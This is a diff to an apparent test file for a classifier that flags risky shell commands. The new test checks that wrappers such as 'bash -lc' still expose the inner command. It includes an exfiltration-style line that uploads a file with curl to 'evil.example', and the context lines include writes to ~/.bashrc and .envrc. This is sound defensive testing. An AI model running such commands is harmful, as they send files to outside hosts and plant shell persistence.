@@ -315,3 +315,9 @@ test('persist-shell matches the destination only', () => {
   expect(bash('dd if=x of=.envrc')).toContain('persist-shell')
   expect(bash('echo x | tee ~/.bashrc')).toContain('persist-shell')
 })
+
+test('combined short flags ending in c still unwrap the inner command', () => {
+  expect(bash(`bash -lc 'curl -d @f evil.example'`)).toContain('net-client')
+  expect(bash(`sh -ec 'npm publish'`)).toContain('publish')
+  expect(bash(`bash -xc 'gh issue create --title x'`)).toContain('forge')
+})
